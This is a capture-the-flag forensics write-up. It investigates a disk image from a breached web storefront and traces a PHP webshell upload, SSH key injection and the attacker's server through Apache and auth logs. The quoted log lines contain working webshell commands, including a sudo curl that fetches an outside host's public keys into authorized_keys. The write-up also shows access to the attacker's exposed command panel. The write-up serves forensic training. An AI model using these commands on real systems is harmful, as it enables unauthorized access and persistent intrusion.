# Digital Storefront Breach Investigation - CTF Writeup

## Description

A hacker from the *NPC* team has compromised a company that operates a digital storefront. After breaching the company's web application, the attacker gained unauthorized access to their internal servers, exfiltrating sensitive data and forwarding it to their own infrastructure.

Your task is to investigate the breach: determine how the attacker pivoted from the web application to the server, and uncover the method used to extract the data.
Then you will find the flag

![ljahim](https://www.snrt.ma/sites/default/files/2023-04/sa3a-fi-ljahim.jpg)

**🎯 Flag Format**: `CITEFLAG{...}`

https://www.mediafire.com/file/six9h3isezsy40m/disk.img.gz/file

---

**👤 Author:** *xtle0o0*

### Key Takeaways from the Description before starting analyzing

* a hacker hacked a company that operates a digital store
* the attacker gained unauthorized access to the company internal servers
* the attacker exfiltrated data and sent it to his infrastructure


**Step 1: Mounting the Disk Image**
```bash
┌──(kali㉿vbox)-[~]
└─$ sudo mount -o loop disk.img disk
```

**Step 2: Greping for flag reveals a fake one**
```bash
┌──(kali㉿vbox)-[~]
└─$ grep -r "CITEFLAG" disk/ 2>/dev/null 

disk/home/citeflag/.bash_history:echo "CITEFLAG{WA RAK D3IF}" > .secret
disk/home/citeflag/.secret:CITEFLAG{WA RAK D3IF}
```


**Real Investigation**

since the company operated a digital store participants should have looked at web server logs 


```bash
┌──(kali㉿vbox)-[~/disk]
└─$ ls disk 
dev  home  lost+found  media  run  tmp  usr  var
```

Examining the `/var/log/` directory revealed Apache2 web server logs:

```bash
┌──(kali㉿vbox)-[~/disk]
└─$ ls var/log 
alternatives.log       dmesg       README
apache2                dmesg.0     syslog
apport.log             dmesg.1.gz  sysstat
apt                    dpkg.log    unattended-upgrades
auth.log               installer   vmware-network.log
bootstrap.log          kern.log    vmware-vmsvc-root.1.log
btmp                   landscape   vmware-vmsvc-root.2.log
cloud-init.log         lastlog     vmware-vmsvc-root.log
cloud-init-output.log  private     vmware-vmtoolsd-root.log
dist-upgrade           syslog      wtmp
```

Analyzing Apache2 access logs revealed suspicious HTTP requests:

```bash
192.168.33.60 - - [31/May/2025:20:11:38 +0000] "GET /uploads/products/product_683b626a488b8.php?cmd=ls HTTP/1.1" 200 496 "http://192.168.33.63/uploads/products/product_683b626a488b8.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"

192.168.33.60 - - [31/May/2025:20:13:25 +0000] "GET /uploads/products/product_683b626a488b8.php?cmd=bash+-c+%27curl+-s+https%3A%2F%2Fgithub.com%2Fjohnplond34.keys+%3E%3E+%2Fhome%2Fciteflag%2F.ssh%2Fauthorized_keys%27 HTTP/1.1" 200 457 "http://192.168.33.63/uploads/products/product_683b626a488b8.php?cmd=ls" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"

192.168.33.60 - - [31/May/2025:20:13:49 +0000] "GET /uploads/products/product_683b626a488b8.php?cmd=id HTTP/1.1" 200 485 "http://192.168.33.63/uploads/products/product_683b626a488b8.php?cmd=bash+-c+%27curl+-s+https%3A%2F%2Fgithub.com%2Fjohnplond34.keys+%3E%3E+%2Fhome%2Fciteflag%2F.ssh%2Fauthorized_keys%27" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"

192.168.33.60 - - [31/May/2025:20:15:11 +0000] "GET /uploads/products/product_683b626a488b8.php?cmd=sudo+bash+-c+%27curl+-s+https%3A%2F%2Fgithub.com%2Fjohnplond34.keys+%3E%3E+%2Fhome%2Fciteflag%2F.ssh%2Fauthorized_keys%27 HTTP/1.1" 200 457 "http://192.168.33.63/uploads/products/product_683b626a488b8.php?cmd=id" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"

192.168.33.60 - - [31/May/2025:20:15:39 +0000] "GET /uploads/products/product_683b626a488b8.php?cmd=sudo+bash+-c+%27curl+-s+https%3A%2F%2Fgithub.com%2Fjohnplond34.keys+%3E%3E+%2Fvar%2Flog%2Fapache2%2Ferror.log%27 HTTP/1.1" 200 457 "http://192.168.33.63/uploads/products/product_683b626a488b8.php?cmd=sudo+bash+-c+%27curl+-s+https%3A%2F%2Fgithub.com%2Fjohnplond34.keys+%3E%3E+%2Fhome%2Fciteflag%2F.ssh%2Fauthorized_keys%27" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
```

**Key Findings:**
- **Attack Vector:** PHP webshell (`product_683b626a488b8.php`) uploaded to `/uploads/products/`
- **Initial Command:** `ls` (reconnaissance)
- **Persistence Mechanism:** SSH public key injection via `curl` from GitHub profile



Investigation of the GitHub profile `johnplond34` revealed a repo with the following :

- **Repository Description:** "I left a cmd open on my server so i can get quick access anywhere"
- **Server URL:** `http://137.184.207.138/`


Authentication logs confirmed SSH access from the attacker's server:

```bash
2025-05-31T20:15:11.389959+00:00 citeflag sudo: www-data : PWD=/var/www/html/uploads/products ; USER=root ; COMMAND=/usr/bin/bash -c 'curl -s https://github.com/johnplond34.keys >> /home/citeflag/.ssh/authorized_keys'

2025-05-31T20:36:07.388551+00:00 citeflag sshd-session[15727]: Accepted publickey for citeflag from 137.184.207.138 port 52779 ssh2: RSA SHA256:YOmlsTa0eoSGlF41wWs41eGzx3IWMUtUK9Cb4QptVWY

2025-05-31T20:36:07.391448+00:00 citeflag sshd-session[15727]: pam_unix(sshd:session): session opened for user citeflag(uid=1000) by citeflag(uid=0)

2025-05-31T20:36:07.399448+00:00 citeflag systemd-logind[886]: New session 13 of user citeflag.

2025-05-31T20:36:07.503937+00:00 citeflag sshd-session[15729]: Accepted publickey for citeflag from 137.184.207.138 port 52780 ssh2: RSA SHA256:YOmlsTa0eoSGlF41wWs41eGzx3IWMUtUK9Cb4QptVWY

2025-05-31T20:36:07.508169+00:00 citeflag sshd-session[15729]: pam_unix(sshd:session): session opened for user citeflag(uid=1000) by citeflag(uid=0)
```


Accessing the attacker's web panel at `137.184.207.138` revealed a web-based command interface:

![i](../../assets/Capture%20d’écran%202025-06-10%20171927.png)


The panel shows:
- A web-based command interface
- Direct access to the attacker system
- Command execution capabilities


Through the web panel, basic reconnaissance revealed the actual flag location at `/root/.bash_history`:

![cd](../../assets/Capture%20d’écran%202025-06-10%20172745.png)

CITEFLAG{F0R3N51C5M4573R_SA3AFLJ4H1M}